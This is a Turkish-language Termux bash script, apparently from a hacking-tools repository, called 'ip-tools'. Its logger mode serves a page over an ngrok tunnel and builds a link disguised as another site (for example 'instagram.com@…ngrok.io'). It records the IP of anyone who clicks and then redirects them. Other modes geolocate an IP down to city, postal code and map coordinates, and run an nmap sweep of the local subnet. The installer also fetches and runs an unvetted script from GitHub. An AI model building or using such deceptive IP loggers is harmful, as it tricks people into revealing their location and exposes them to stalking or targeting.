#!/bin/bash

# NMAP  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/nmap ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m NMAP PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install nmap -y
fi

# CURL  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/curl ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m CURL PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install curl -y
fi

# PHP  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/php ]];then
	echo
	echo
	echo
	printf "\e[32m[*] \e[0mPHP PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install php -y
fi

# NGROK KONTROLÜ #

if [[ ! -a $PREFIX/bin/ngrok ]];then
	echo
	echo
	echo
	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
	echo
	echo
	echo
	git clone https://github.com/termuxxtoolss/ngrok-kurulum
	cd ngrok-kurulum
	bash ngrok-kurulum.sh
	cd ..
	rm -rf ngrok-kurulum
fi

if [[ $1 == update ]];then
	cd files
	./update.sh update
	exit
fi

kontrol=$(which ip-tools |wc -l)
if [[ $kontrol == 0 ]];then
	echo -e "#!/bin/bash\ncd \$HOME/.IP-TOOLS\nbash ip-tools.sh \$1 \$2" > $PREFIX/bin/ip-tools
	chmod 777 $PREFIX/bin/ip-tools
	cd ..
	mv IP-TOOLS .IP-TOOLS
	echo
	echo
	echo
	printf "\e[32m[✓] \e[1;4;33mip-tools\e[0;97m KISAYOL OLUŞTURULDU"
	echo
	echo
	echo
	exit
fi
# BİLDİRİM SCRİPT KONTROLÜ #

if [[ -a files/termuxxtoolssmod ]];then
	mv files/termuxxtoolssmod $PREFIX/bin
	chmod 777 $PREFIX/bin/*
fi
control=$(ps aux | grep "ngrok" | grep -v grep |grep -o ngrok)
if [[ -n $control ]];then
	killall ngrok
	killall php
fi
clear
cd files
./update.sh
cd ..
if [[ -a updates_infos ]];then
	rm updates_infos
	exit
fi
cd files
if [[ $1 == "" ]];then
	clear
	bash banner.sh
	echo
	echo
	echo
	printf "\e[97m
                  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[1;33m
	                    |H|E|L|P|\e[0;97m
  	          +-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[97m


                      \e[33m[ \e[36mİP LOGGER OPTİONS \e[33m]


		      \e[32mip-tools \e[33m--logger\e[31m


         ──────────────────────────────────────────────────

                      \e[33m[ \e[36mİP SCAN OPTİONS \e[33m]


	              \e[32mip-tools \e[33m--scan\e[97m 216.58.212.46

		      \e[32mip-tools \e[33m--scan\e[97m google.com\e[31m

                      
         ──────────────────────────────────────────────────

		      \e[33m[\e[36m LOCAL İP SCAN OPTİONS \e[33m]
		      

		      \e[32mip-tools \e[33m --local\e[97m

		      "
	echo
	echo
	echo
	echo
	echo
	echo
	exit
fi
_local_scan() {
	clear
	echo
	echo
	bash banner.sh _ip_scan
	kontrol=$(ifconfig |grep -o "broadcast")
	if [[ $kontrol == broadcast ]];then
		echo
	else
		echo
		echo
		echo
		printf "\e[31m[!]\e[0m KABLOSUZ AĞ BAĞLANTISI YOK \e[31m!!!\e[0m"
		echo
		echo
		echo
		exit
	fi
	_nmap=$(ifconfig |grep -o 192.168.[0-9] |sed -n 1p)
	echo
	echo
	echo
	printf "\e[32m[*]\e[0m NMAP AĞ TARAMASI YAPILIYOR.."
	echo
	echo
	echo
	sleep 2
	#################### NMAP TARAMA ####################

	printf "
	\e[31m──────────────────────────────────────────────────
	\e[32m"
	echo
	echo
	echo
	nmap $_nmap.0/24
	echo
	echo
	echo
	printf "\e[32m[✓]\e[0m NMAP AĞ TARAMASI TAMAMLANDI"
	echo
	echo
	echo
	exit
}
_ip_scan() {
clear
ip=$(cat .ip)
echo
echo
bash banner.sh _ip_scan
ulke=$(cat .scan-output.txt |jq .country |tr -d '"')
ulkekodu=$(cat .scan-output.txt |jq .country_code |tr -d '"')
baskent=$(cat .scan-output.txt |jq .country_capital |tr -d '"')
ulkeno=$(cat .scan-output.txt |jq .country_phone |tr -d '"')
bolge=$(cat .scan-output.txt |jq .region |tr -d '"')
bolgeplaka=$(curl -s "http://ip-api.com/json/$ip" |awk -F'"' {'print $16'})
sehir=$(cat .scan-output.txt |jq .city |tr -d '"')
postakodu=$(curl -s "http://ip-api.com/json/$ip" |awk -F'"' {'print $28'})
enlem=$(cat .scan-output.txt |jq .latitude |tr -d '"')
boylam=$(cat .scan-output.txt |jq .longitude |tr -d '"')
konum="$enlem,$boylam"
zamandilimi=$(cat .scan-output.txt |jq .timezone_name |tr -d '"')
iss=$(cat .scan-output.txt |jq .isp |tr -d '"')
ip=$(cat .scan-output.txt |jq .ip |tr -d '"')
echo
echo
echo
printf "
            İP                          : \e[32m$ip\e[97m

            ÜLKE                        : \e[32m$ulke\e[97m

            ÜLKE KODU                   : \e[32m$ulkekodu\e[97m
            
	    ÜLKE BAŞKENTİ               : \e[32m$baskent\e[97m
	    
	    ÜLKE TELEFON KODU           : \e[32m$ulkeno\e[97m

            BÖLGE                       : \e[32m$bolge\e[97m

            BÖLGE PLAKA                 : \e[32m$bolgeplaka\e[97m

            ŞEHİR                       : \e[32m$sehir\e[97m

            POSTA KODU                  : \e[32m$postakodu\e[97m

            ZAMAN DİLİMİ                : \e[32m$zamandilimi\e[97m

            İNTERNET SERVİS SAĞLAYICISI : \e[32m$iss\e[97m

            KONUM                       : \e[32mhttps://www.google.com/maps/place/$konum/@$konum,16z\e[97m

"
echo
echo
echo
echo
rm .ip
rm .scan-output.txt
}
_ip_logger(){
	if [[ -a ip.txt ]];then
		rm ip.txt
	fi
	killall ngrok
	killall php
	clear
	echo
	echo
	bash banner.sh _ip_logger
	echo
	echo
	echo -e "\e[97m  ÖRNEK : \e[32mhttps://t.me/termuxxtoolss\e[97m"
	echo
	echo
	read -e -p $'\e[31m───────[ \e[97mYÖNLENDİRELECEK ADRESİ GİRİNİZ\e[31m ]───────►  \e[0m' orientation
	echo
	echo
	echo
	echo -e "\e[1;97m  ÖRNEK : \e[32mhttps://instagram.com\e[97m\n\n  \e[97mNOT   : \e[33mHERHANGİ BİR SİTE ADI GİREBİLİRSİN"
	echo
	echo
	read -e -p $'\e[31m───────[ \e[97mMASKELEME ADRESİ GİRİNİZ\e[31m ]───────►  \e[0m' mask
	echo
	echo
	echo
	echo -e "\e[1;33m[*]\e[32m  LİNK OLUŞTURULUYOR\n\n\tLÜTFEN BEKLEYİNİZ...\e[97m"
	echo
	echo
	echo
	echo
	php -S 127.0.0.1:6667 & ngrok http 6667 > /dev/null &
	while :
	do
		kontrol=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"' |wc -l)
		if [[ $kontrol == 1 ]];then
			break
		fi
	done
	if [[ -n $orientation ]];then
		echo -e "$orientation" > .link
	else
		echo -e "https://t.me/termuxxtoolss" > .link
	fi
	if [[ ! -n $mask ]];then
		mask="https://instagram.com"
	fi
	url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"')
	domain=$(echo -e "$url" |grep -o /[a-z.0-9.A-Z.]\*.ngrok.io |tr -d '/')
	echo
	echo
	echo
	echo
	echo -e "\e[32mİP LOGGER LİNK : \e[97m$mask@$domain"
	echo
	echo
	echo
	while :
	do
		if [[ -a ip.txt ]];then
			sleep 1
			killall ngrok
			killall php
			clear
			bash banner.sh _ip_logger
			cat ip.txt >> ip-logger.txt
			echo
			echo
			echo
			echo -e "
	\t\t\e[1;33mBİLGİ ALINDI\n
	\e[31m──────────────────────────────────────────────────

	\e[32m$(cat ip.txt)

	\e[31m──────────────────────────────────────────────────\e[0m"
			echo
			echo
			echo
			rm ip.txt
			rm .link
			break
			exit
		fi
	done
}

if [[ $1 == --local ]];then
	_local_scan
	exit
fi
if [[ $1 == --scan ]];then
	echo "$2" > .ip
	if [[ -n $2 ]];then
		curl -s ipwhois.app/json/$2 |jq > .scan-output.txt
	else
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m İP VEYA DOMAİN GİRİNİZ\e[31m!!!\e[97m"
		echo
		echo
		echo
		rm .ip
		rm .scan-output.txt
		exit
	fi
	control=$(cat .scan-output.txt |grep -o true)
	if [[ $control != true ]];then
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m HATALI İP VEYA DOMAİN \e[31m!!!\e[97m"
		echo
		echo
		echo
		rm .ip
		rm .scan-output.txt
		exit
	fi
	_ip_scan
fi
if [[ $1 == --logger ]];then
	_ip_logger
	exit
fi

